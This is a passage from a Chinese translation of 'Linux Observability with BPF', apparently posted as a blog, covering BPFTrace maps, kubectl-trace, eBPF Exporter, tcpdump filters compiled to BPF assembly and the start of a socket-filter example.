/tmp/example.bt</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    ^Cexiting BPFTrace program</span><br></pre></td></tr></table></figure><h5 id="动态映射"><a href="#动态映射" class="headerlink" title="动态映射"></a>动态映射</h5><p>BPFTrace实现的一项方便的功能是动态映射关联。 它可以动态生成BPF映射，你可以将其用于本书中看到的许多操作。所有映射关联都以字符<code>@</code>开头，后面跟要创建的映射的名称。 还可以通过为它们分配值来关联这些映射中的更新元素。</p><p>如果我们以本节开头的示例为例，我们可以汇总系统打开特定文件的频率。为此，我们需要计算内核在特定文件上运行open系统调用的次数，然后将这些计数器存储在映射中。为了识别这些聚合，我们可以使用文件路径作为映射的键。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kprobe:do_sys_open</span><br><span class="line">&#123;</span><br><span class="line"> @opens[str(arg1)] = count()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行程序后输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> bpftrace /tmp/example.bt</span><br><span class="line">    Attaching 3 probes...</span><br><span class="line">    starting BPFTrace program</span><br><span class="line">    ^Cexiting BPFTrace program</span><br><span class="line">    @opens[/var/lib/snapd/lib/gl/haswell/libdl.so.2]: 1</span><br><span class="line">    @opens[/var/lib/snapd/lib/gl32/x86_64/libdl.so.2]: 1</span><br><span class="line">    ...</span><br><span class="line">    @opens[/usr/lib/locale/en.utf8/LC_TIME]: 10</span><br><span class="line">    @opens[/usr/lib/locale/en_US/LC_TIME]: 10</span><br><span class="line">    @opens[/usr/share/locale/locale.alias]: 12</span><br><span class="line">    @opens[/proc/8483/cmdline]: 12</span><br></pre></td></tr></table></figure><p>如你所见，BPFTrace在停止程序执行时打印映射的内容。它汇总了内核在我们系统中打开文件的频率。 默认情况下，BPFTrace总是会在它终止时打印它创建的每个映射的内容。 您无需指定要打印的映射；你可以通过使用内置函数clear清除END块内的映射来更改该行为。 这是因为打印映射总是发生在<code>footer</code>块执行之后。</p><h4 id="kubectl-trace"><a href="#kubectl-trace" class="headerlink" title="kubectl-trace"></a>kubectl-trace</h4><p><code>kubectl-trace</code>是Kubernetes命令行kubectl的插件。它可以帮助你在Kubernetes集群中处理BPFTrace程序，而无需安装任何额外的包或模块。它通过使用容器镜像调度一个<code>Kubernetes job</code>来实现这一点，该容器镜像已经安装了运行程序所需的一切。 此镜像称为<code>trace-runner</code>，它也可以在公共Docker中使用。å</p><h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><p>你需要使用Go的工具链从其源存储库安装<code>kubectl-trace</code>，因为其开发人员不提供任何二进制包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/iovisor/kubectl-trace/cmd/kubectl-trace</span><br></pre></td></tr></table></figure><p>在Go的工具链编译程序并将其放入路径后，kubectl的插件系统会自动检测到这个新插件。<code>kubectl-trace</code>会在你第一次执行它时自动下载它在集群中运行的Docker镜像。</p><h5 id="检查k8s节点"><a href="#检查k8s节点" class="headerlink" title="检查k8s节点"></a>检查k8s节点</h5><p>可以使用<code>kubectl-trace</code>来定位运行容器的节点和pod，也可以使用它来定位在这些容器上运行的进程。在第一种情况下，你几乎可以运行任何你想要的BPF程序。但是，在第二种情况下只能运行将用户空间探测器附加到这些进程的程序。</p><p>如果要在特定节点上运行BPF程序，则需要一个适当的标识符，以便Kubernetes将作业安排在适当的位置。有了这个标识符之后，运行程序就和运行你之前看到的程序类似。 如下所示我们运行单行来计算文件打开次数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl trace run node/node_identifier -e \</span><br><span class="line">      "kprobe:do_sys_open &#123; @opens[str(arg1)] = count() &#125;"</span><br></pre></td></tr></table></figure><p>我们使用命令<code>kubectl trace run</code>将其安排在特定的集群节点中。 我们使用语法<code>node/...</code>来告诉<code>kubectl-trace</code>我们正在针对集群中的一个节点。如果我们想针对特定的pod，我们可以将<code>node/</code>替换为<code>pod/</code>。</p><p>在特定容器上运行程序更加复杂</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kubectl trace run pod/pod_identifier -n application_name -e &lt;&lt;PROGRAM</span><br><span class="line">    uretprobe:/proc/$container_pid/exe:"main.main" &#123;</span><br><span class="line">      printf("exit: %d\n", retval)</span><br><span class="line">    &#125;</span><br><span class="line">PROGRAM</span><br></pre></td></tr></table></figure><p>在这个命令中有两件事情需要强调。第一个是我们需要容器中运行的应用程序的名称才能找到它的进程； 这对应于我们示例中的<code>application_name</code>， 需要使用在容器中执行的二进制文件的名称，例如<code>nginx</code>或<code>memc ached</code>。 通常，容器只运行一个进程，但这为我们提供了额外的保证，即我们将程序附加到正确的进程。第二个方面是在BPF程序中包含<code>$container_pid</code>。 这不是BPFTrace辅助函数，而是<code>kubectl-trace</code>用作进程标识符替换的占位符。在运行BPF程序之前，<code>trace-runner</code>用适当的标识符替换占位符，并将我们的程序附加到正确的进程。</p><p>在本节和前面几节中，我们专注于更有效地运行BPF程序的工具，即使在容器环境中也是如此。 在下一节中，我们将讨论一个更好的工具，它将BPF程序收集的数据与开源监控系统Prometheus集成在一起。</p><h4 id="eBPF-Exporter"><a href="#eBPF-Exporter" class="headerlink" title="eBPF Exporter"></a>eBPF Exporter</h4><p><code>eBPF Exporter</code>是一个允许你自定义BPF跟踪指标导出到Prometheus的工具。Prometheus是一个高度可扩展的监控和警报系统。与其他监控系统不同的一个关键因素是它使用拉取策略来获取指标，而不是期望客户端将指标推送给它。这允许用户编写可以从任何系统收集指标的自定义导出器，Prometheus使用API模式提取它们。<code>eBPF Exporter</code>实现此API以从BPF程序中获取跟踪指标并将它们导入Prometheus。</p><h5 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h5><p>尽管<code>eBPF Exporter</code>提供二进制包，但我们建议从源代码安装它，因为通常没有新版本。从源代码构建还可以让你访问BCC（BPF 编译器集合）之上构建的更新功能。</p><p>要从源代码安装<code>eBPF Exporter</code>，你需要在计算机上已经安装BCC和Go的工具链。 有了这些先决条件后可以使用Go下载和构建二进制文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/cloudflare/ebpf_exporter/...</span><br></pre></td></tr></table></figure><h5 id="从BPF导出指标"><a href="#从BPF导出指标" class="headerlink" title="从BPF导出指标"></a>从BPF导出指标</h5><p><code>eBPF Exporter</code>使用YAML文件进行配置，你可以在其中指定要从系统收集的指标、生成这些指标的BPF程序以及它们如何转换为Prometheus。当 Prometheus向<code>eBPF Exporter</code>发送请求以提取指标时，此工具会将BPF程序正在收集的信息转换为指标值。<code>eBPF Exporter</code>捆绑了许多系统收集非常有用的信息的程序，例如周期指令(IPC)和CPU缓存命中率。</p><p><code>eBPF Exporter</code>的简单配置文件包括三个主要部分。在第一部分中定义了希望Prometheus从系统中提取的指标。 在这里可以将BPF映射中收集的数据转换为Prometheus理解的指标。 如下示例所示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">programs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">timers</span></span><br><span class="line"><span class="attr">metrics:</span> </span><br><span class="line"><span class="attr">counters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">timer_start_total</span></span><br><span class="line"><span class="attr">help:</span> <span class="string">Timers</span> <span class="string">fired</span> <span class="string">in</span> <span class="string">the</span> <span class="string">kernel</span> </span><br><span class="line"><span class="attr">table:</span> <span class="string">counts</span></span><br><span class="line"><span class="attr">labels:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">function</span> </span><br><span class="line"><span class="attr">size:</span> <span class="number">8</span></span><br><span class="line"><span class="attr">decoders:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ksym</span></span><br></pre></td></tr></table></figure><p>我们定义了一个名为<code>timer_start_total</code>的指标，它聚合了内核启动定时器的频率。我们还指定我们希望从名为<code>counts</code>的BPF映射中收集此信息。 最后，我们为映射的键定义了一个翻译函数。 这是必要的，因为映射键通常是指向信息的指针，我们希望向Prometheus发送实际的函数名称。</p><p>本例中的第二部分描述了我们想要将BPF程序附加到的探针。在这种情况下，我们要跟踪计时器开始调用； 我们使用<code>tracepoint timer:timer_start</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tracepoints:</span><br><span class="line">  timer:timer_start: tracepoint__timer__timer_start</span><br></pre></td></tr></table></figure><p>这里我们告诉<code>eBPF Exporter</code>，我们希望将BPF函数<code>tracepoint__timer__timer_start</code>附加到这个特定的跟踪点。 接下来让我们看看如何声明该函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code: |</span><br><span class="line">BPF_HASH(counts, u64);</span><br><span class="line"><span class="comment">// Generates function tracepoint__timer__timer_start </span></span><br><span class="line">TRACEPOINT_PROBE(timer, timer_start) &#123;</span><br><span class="line">  counts.increment((u64) args-&gt;function);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>eBPF Exporter</code>使用BCC编译程序，因此我们可以访问它的所有宏和帮助程序。前面的代码片段使用宏<code>TRACEPOINT_PROBE</code>生成最终函数，我们将附加到名为<code>tracepoint__timer__timer_start</code>的跟踪点。</p><p>Cloudflare使用<code>eBPF Exporter</code>来监控其所有数据中心的指标。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>在本章中，我们讨论了一些系统分析工具。当你需要调试系统上的任何异常时，这些工具可以随时使用。所有工具都抽象了我们在前几章中看到的概念，以帮助你使用BPF即便你的环境还没有准备好。这是BPF与其他众多分析工具相比的优势之一；因为任何现代Linux内核都包含BPF虚拟机，所以你可以在其上构建利用这些强大功能的新工具。</p><p>还有许多其他工具将BPF用于类似目的，例如<code>Cilium</code>和<code>Sysdig</code>，我们鼓励你去尝试使用它们。</p><p>在接下来的章节中，我们将深入探讨它的网络功能。我们将展示如何分析任何网络中的流量以及如何使用BPF来控制网络中的消息。</p><h2 id="第六章节"><a href="#第六章节" class="headerlink" title="第六章节"></a>第六章节</h2><h3 id="Linux网络和BPF"><a href="#Linux网络和BPF" class="headerlink" title="Linux网络和BPF"></a>Linux网络和BPF</h3><p>从网络的角度来看，我们将BPF程序用于两个用途：数据包捕获和过滤。</p><p>这意味着用户空间程序可以将过滤器附加到任何套接字并提取有关流经它的数据包的信息，并允许/禁止/重定向某些类型的数据包，因为它们在该级别可以看到。</p><p>本章的目的是解释BPF程序在Linux内核网络堆栈中网络数据路径的不同阶段如何与<code>Socket Buffer</code>结构进行交互。 我们将确定两种类型的程序作为常见用例</p><ul><li>与套接字相关的程序类型</li><li>基于BPF的流量控制分类器编写的程序</li></ul><p><code>Socket Buffer</code>结构，也称为SKB或<code>sk_buff</code>，是内核中为每个发送或接收的数据包创建和使用的结构。通过读取SKB可以传递或丢弃数据包并填充BPF映射以创建有关当前流量的统计信息和流量指标。</p><p>此外，一些BPF程序允许你操作SKB，并通过扩展转换最终数据包，以重定向或改变它们的基本结构。例如，在仅使用IPv6的系统上可以编写一个程序，将所有收到的数据包从IPv4转换为 IPv6，这可以通过修改数据包的SKB来完成。</p><p>理解网络中的BPF和eBPF的关键是需要了解我们可以编写的不同类型的程序之间的差异，以及不同的程序如何导致相同的结果；在下一节中，我们将介绍在套接字级别进行过滤的两种方法：使用经典的BPF过滤器，以及使用附加到套接字的eBPF程序。</p><h3 id="BPF和包过滤"><a href="#BPF和包过滤" class="headerlink" title="BPF和包过滤"></a>BPF和包过滤</h3><p>如前所述，BPF过滤器和eBPF程序是BPF程序在网络环境中的主要用例。然而最开始BPF程序是包过滤的同义词。</p><p>包过滤仍然是最重要的用例之一，并且已经从经典的BPF (cBPF)扩展到<code>Linux 3.19</code>中的eBPF，并在过滤程序类型<code>BPF_PROG_TYPE_SOCKET_FILTER</code>中添加了与映射相关的功能。</p><p>过滤器主要可用于三个高级场景：</p><ul><li>实时流量丢弃（例如，仅允许用户数据报协议UDP流量，丢弃其他任何内容）</li><li>实时观察流入系统的一组过滤数据包</li><li>使用<code>pcap</code>格式对实时系统上捕获的网络流量进行回顾分析</li></ul><p>术语<code>pcap</code>来自两个词的结合：数据包(packet)和捕获(capture)。<code>pcap</code>格式在数据包捕获库 <code>libpcap</code>的库中实现，是用于数据包捕获的特定域API。 当你希望在实时系统上捕获的一组数据包能够直接保存到文件中，方便后续使用<code>pcap</code>格式导出的数据包流的工具进行分析时，这种格式在调试场景中很有用。</p><p>在接下来的部分中，我们将展示两种不同的方式来应用BPF程序的包过滤。首先，我们展示了像<code>tcpdump</code>这样的常见且广泛使用的工具如何充当用作过滤器的BPF程序的更高级的接口。然后我们使用<code>BPF_PROG_TYPE_SOCKET_FILTER</code>BPF程序类型编写并加载我们自己的程序。</p><h4 id="tcpdump和BPF表达式"><a href="#tcpdump和BPF表达式" class="headerlink" title="tcpdump和BPF表达式"></a>tcpdump和BPF表达式</h4><p>说到实时流量分析和观察，每个人都知道的命令行工具之一就是<code>tcpdump</code>。 本质上是<code>libpcap</code>的前端，它允许用户定义高级过滤表达式。<code>tcpdump</code>所做的是从你选择的网络接口（或任何接口）读取数据包，然后将接收到的数据包的内容写入标准输出或文件。然后可以使用<code>pcap</code>过滤器语法过滤数据包流。<code>pcap</code>过滤器语法是一种DSL，使用一组原语组成的高级表达式集过滤数据包，这些原语通常比BPF汇编更容易记住。解释<code>pcap</code>过滤器语法中所有可能的原语和表达式超出了本章的范围，具体可以使用<code>man 7 pcap-filter</code>查看。</p><p>场景是我们在一个Linux机器中，它在端口<code>8080</code>上公开了一个Web服务器；这个Web服务器没有记录它接收到的请求，我们想知道它是否正在接收任何请求以及这些请求是如何流入的，因为所服务应用程序的客户抱怨在浏览时无法获得任何响应产品页面。在这一点上，我们只知道客户正在使用由该Web服务器提供的Web应用程序连接到我们的产品页面，并且总是发生这种情况，我们不知道是什么原因，因为最终用户通常不会调试服务，不幸的是我们没有在这个系统中部署任何日志记录或错误报告策略，因此我们在调查问题时完全是盲目的。幸运的是，有一个工具可以帮助我们！它是<code>tcpdump</code>，可以告诉它只过滤在我们系统中流动的IPv4数据包，这些数据包在端口8080上使用传输控制协议 (TCP)。因此，我们将能够分析Web服务器的流量。</p><p>以下是使用<code>tcpdump</code>进行过滤的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump -n 'ip and tcp port 8080'</span><br></pre></td></tr></table></figure><p>让我们看看这个命令中发生了什么：</p><ul><li><code>-n</code> 是为了告诉<code>tcpdump</code>不要将地址转换为各自的名称，我们想查看源地址和目标地址。</li><li><code>ip and tcp port 8080</code>是<code>tcpdump</code>用于过滤数据包的<code>pcap</code>过滤器表达式。ip表示 <code>IPv4</code>，它是一个连词，表示一个更复杂的过滤器，以允许添加更多表达式来匹配，然后我们指定我们只对来自tcp端口8080或到达端口8080的tcp数据包感兴趣。在这种情况下，更好的过滤器应该是<code>tcp dst port 8080</code>，因为我们只对目标端口为<code>8080</code>的数据包感兴趣，而不是来自它的数据包。</li></ul><p>其输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class="line">    listening on wlp4s0, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">    12:04:29.593703 IP 192.168.1.249.44206 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 1:325, ack 1, win 343,</span><br><span class="line">       options [nop,nop,TS val 25580829 ecr 595195678],</span><br><span class="line">       length 324: HTTP: GET / HTTP/1.1</span><br><span class="line">    12:04:29.596073 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [.],</span><br><span class="line">       seq 1:1449, ack 325, win 507,</span><br><span class="line">       options [nop,nop,TS val 595195731 ecr 25580829],</span><br><span class="line">       length 1448: HTTP: HTTP/1.1 200 OK</span><br><span class="line">    12:04:29.596139 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [P.],</span><br><span class="line">       seq 1449:2390, ack 325, win 507,</span><br><span class="line">       options [nop,nop,TS val 595195731 ecr 25580829],</span><br><span class="line">       length 941: HTTP</span><br><span class="line">    12:04:46.242924 IP 192.168.1.249.44206 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 660:996, ack 4779, win 388,</span><br><span class="line">       options [nop,nop,TS val 25584934 ecr 595204802],</span><br><span class="line">       length 336: HTTP: GET /api/products HTTP/1.1</span><br><span class="line">    12:04:46.243594 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [P.],</span><br><span class="line">       seq 4779:4873, ack 996, win 503,</span><br><span class="line">       options [nop,nop,TS val 595212378 ecr 25584934],</span><br><span class="line">       length 94: HTTP: HTTP/1.1 500 Internal Server Error</span><br><span class="line">    12:04:46.329245 IP 192.168.1.249.44234 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 471:706, ack 4779, win 388,</span><br><span class="line">       options [nop,nop,TS val 25585013 ecr 595205622],</span><br><span class="line">       length 235: HTTP: GET /favicon.ico HTTP/1.1</span><br><span class="line">    12:04:46.331659 IP 192.168.1.63.8080 &gt; 192.168.1.249.44234: Flags [.],</span><br><span class="line">       seq 4779:6227, ack 706, win 506,</span><br><span class="line">       options [nop,nop,TS val 595212466 ecr 25585013],</span><br><span class="line">       length 1448: HTTP: HTTP/1.1 200 OK</span><br><span class="line">    12:04:46.331739 IP 192.168.1.63.8080 &gt; 192.168.1.249.44234: Flags [P.],</span><br><span class="line">       seq 6227:7168, ack 706, win 506,</span><br><span class="line">       options [nop,nop,TS val 595212466 ecr 25585013],</span><br><span class="line">       length 941: HTTP</span><br></pre></td></tr></table></figure><p>可以看到，我们有一堆请求进展顺利，返回200 OK状态代码，但在<code>/api/products</code>端点上还有一个带有500内部服务器错误代码的请求。表示我们在列出产品时服务器遇到问题！</p><p>此时，你可能会问，如果BPF程序有自己的语法，所有这些<code>pcap</code>过滤内容和<code>tcpdump</code>有什么关系？Linux上的<code>Pcap</code>过滤器被编译为BPF程序！而且因为<code>tcpdump</code>使用<code>pcap</code>过滤器进行过滤，这意味着每次使用过滤器执行<code>tcpdump</code>时，实际上是在编译和加载BPF程序来过滤数据包。幸运的是，通过将<code>-d</code>标志传递给<code>tcpdump</code>，你可以转储在使用指定过滤器时将加载的BPF指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump  -d  'ip and tcp port 8080'</span><br></pre></td></tr></table></figure><p>该过滤器与上一个示例中使用的过滤器相同，但由于<code>-d</code>标志，现在输出是一组BPF汇编指令。</p><p>输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(000) ldh      [12]</span><br><span class="line">(001) jeq      #0x800           jt 2jf 12</span><br><span class="line">(002) ldb      [23]</span><br><span class="line">(003) jeq      #0x6             jt 4jf 12</span><br><span class="line">(004) ldh      [20]</span><br><span class="line">(005) jset     #0x1fff          jt 12jf 6</span><br><span class="line">(006) ldxb     4*([14]&amp;0xf)</span><br><span class="line">(007) ldh      [x + 14]</span><br><span class="line">(008) jeq      #0x1f90          jt 11jf 9</span><br><span class="line">(009) ldh      [x + 16]</span><br><span class="line">(010) jeq      #0x1f90          jt 11jf 12</span><br><span class="line">(011) ret      #262144</span><br><span class="line">(012) ret      #0</span><br></pre></td></tr></table></figure><p>分析如下</p><p>ldh [12]：在偏移量12处从累加器加载(ld)一个(h)半字（16 位），这是<code>Ethertype</code>字段，第二层以太网帧结构如下图所示。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/1.png" alt="1"></p><p>jeq #0x800 jt 2 jf 12：如果 (eq) 相等则跳转(j) ；检查上一条指令中的<code>Ethertype</code>值是否等于<code>0x800</code>（这是 IPv4 的标识符），然后使用跳转目标，如果为真（jt）则为2，如果为假（jf）则为12，因此这将继续到下一个如果Internet协议是IPv4的指令——否则它将跳转到末尾并返回零。</p><p>ldb [23]：加载字节(ldb)，将从IP帧中加载更高层协议字段，该字段可在偏移量23处找到——偏移量23来自以太网第2层帧中头的14个字节的添加加上协议在IPv4头中的位置，即第9个，因此14+9=23。</p><p>jeq #0x6 jt 4 jf 12：如果相等，再跳一次。这种情况下，我们检查之前提取的协议是<code>0x6</code>，即TCP。如果是，我们跳到下一条指令(4)或者我们走到最后(12)——如果不是，我们丢弃数据包。</p><p>ldh [20]：这是另一个加载半字指令——在这种情况下，它是从IPv4头加载数据包偏移量+分片偏移量的值。</p><p>jset #0x1fff jt 12 6：如果我们在分片偏移中找到的任何数据为真，则此<code>jset</code>指令将跳转到12——否则，跳转到6，即下一条指令。指令<code>0x1fff</code>之后的偏移量告诉<code>jset</code>指令只查看最后13个字节的数据。（扩展为 0001 1111 1111 1111）</p><p>ldxb 4*([14]&amp;0xf)：将(b)加载(ld)到x中。该指令会将IP标头长度的值加载到x中。</p><p>ldh [x+14]：另一个加载半字指令将获取偏移量(x + 14)处的值，IP标头长度+14，这是数据包中源端口的位置。</p><p>jeq #0x1f90 jt 11 jf 9：如果(x + 14)处的值等于<code>0x1f90</code>（十进制的 8080），这意味着源端口将是<code>8080</code>，继续11或继续检查目标端口是否在端口8080上，如果是错误的，继续9 .</p><p>ldh [x + 16]：这是另一个加载半字指令，它将获取偏移量(x + 16)处的值，这是数据包中目标端口的位置。</p><p>jeq #0x1f90 jt 11 jf 12：这里如果相等再跳转一次，这次用来检查目的地是否为<code>8080</code>，跳转到11；如果不是，转至12并丢弃该数据包。</p><p>ret #262144：到达此指令时，会找到匹配项，从而返回匹配的快照长度。 默认情况下，此值为262144字节。 可以使用<code>tcpdump</code>中的<code>-s</code>参数对其进行调整。</p><p>如果只考虑以<code>8080</code>作为目标的数据包，而不是作为源的数据包，<code>tcpdump</code>示例如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump -d 'ip and tcp dst port 8080'</span><br><span class="line">(000) ldh      [12]</span><br><span class="line">(001) jeq      #0x800           jt 2jf 10</span><br><span class="line">(002) ldb      [23]</span><br><span class="line">(003) jeq      #0x6             jt 4jf 10</span><br><span class="line">(004) ldh      [20]</span><br><span class="line">(005) jset     #0x1fff          jt 10jf 6</span><br><span class="line">(006) ldxb     4*([14]&amp;0xf)</span><br><span class="line">(007) ldh      [x + 16]</span><br><span class="line">(008) jeq      #0x1f90          jt 9jf 10</span><br><span class="line">(009) ret      #262144</span><br><span class="line">(010) ret      #0</span><br></pre></td></tr></table></figure><p>除了像我们那样分析从<code>tcpdump</code>生成的程序集之外，你可能还想编写自己的代码来过滤网络数据包。事实证明，在这种情况下，最大的挑战将是实际调试代码的执行以确保它符合我们的期望； 在这种情况下，在内核源代码树中，<code>tools/bpf</code>中有一个名为<code>bpf_dbg.c</code>的工具，它本质上是一个调试器，允许加载程序和<code>pcap</code>文件以逐步测试执行。</p><p><code>tcpdump</code>也可以直接从<code>.pcap</code>文件中读取，并对其应用BPF过滤器。</p><h4 id="原始套接字的数据包过滤"><a href="#原始套接字的数据包过滤" class="headerlink" title="原始套接字的数据包过滤"></a>原始套接字的数据包过滤</h4><p><code>BPF_PROG_TYPE_SOCKET_FILTER</code>程序类型允许你将BPF程序附加到套接字。它接收到的所有数据包都会以<code>sk_buff</code>结构体的形式传递给程序，然后程序可以决定是丢弃还是允许。这种程序还具有访问和处理映射的能力。</p><p>让我们看一个例子，看看如何使用这种BPF程序。</p><p>我们示例程序的目的是计算在观察下流经接口的TCP、UDP和互联网控制消息协议(ICMP)数据包的数量。为此，我们需要以下内容：</p><ul><li>可以看到数据包流动的BPF程序</li><li>加载程序并将其附加到网络接口的代码</li><li>用于编译程序并启动加载程序的脚本</li></ul><p>此时我们可以通过两种方式编写BPF程序：作为C代码然后编译为ELF文件，或者直接作为BPF程序集。对于这个例子，我们选择使用C代码来展示更高层次的抽象以及如何使用Clang来编译程序。</p><h5 id="BPF程序"><a href="#BPF程序" class="headerlink" title="BPF程序"></a>BPF程序</h5><p>这里BPF程序的主要职责是访问它接收到的数据包；检查其协议是TCP、UDP还是ICMP，然后在找到的协议的特定键上增加映射数组上的计数。</p><p>对于这个程序，我们将利用位于内核源码中<code>samples/bpf/bpf_load.c</code>中的帮助程序解析ELF文件的加载机制。 加载函数<code>load_bpf_file</code>能够识别某些特定的ELF节头，并将它们与相应的程序类型相关联。 代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> is_socket = <span class="built_in">strncmp</span>(event, <span class="string">"socket"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_kprobe = <span class="built_in">strncmp</span>(event, <span class="string">"kprobe/"</span>, <span class="number">7</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_kretprobe = <span class="built_in">strncmp</span>(event, <span class="string">"kretprobe/"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_tracepoint = <span class="built_in">strncmp</span>(event, <span class="string">"tracepoint/"</span>, <span class="number">11</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_raw_tracepoint = <span class="built_in">strncmp</span>(event, <span class="string">"raw_tracepoint/"</span>, <span class="number">15</span>) == <span class="number">0</span>; </span><br><span class="line"><span class="keyword">bool</span> is_xdp = <span class="built_in">strncmp</span>(event, <span class="string">"xdp"</span>, <span class="number">3</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_perf_event = <span class="built_in">strncmp</span>(event, <span class="string">"perf_event"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_cgroup_skb = <span class="built_in">strncmp</span>(event, <span class="string">"cgroup/skb"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_cgroup_sk = <span class="built_in">strncmp</span>(event, <span class="string">"cgroup/sock"</span>, <span class="number">11</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sockops = <span class="built_in">strncmp</span>(event, <span class="string">"sockops"</span>, <span class="number">7</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sk_skb = <span class="built_in">strncmp</span>(event, <span class="string">"sk_skb"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sk_msg = <span class="built_in">strncmp</span>(event, <span class="string">"sk_msg"</span>, <span class="number">6</span>) == <span 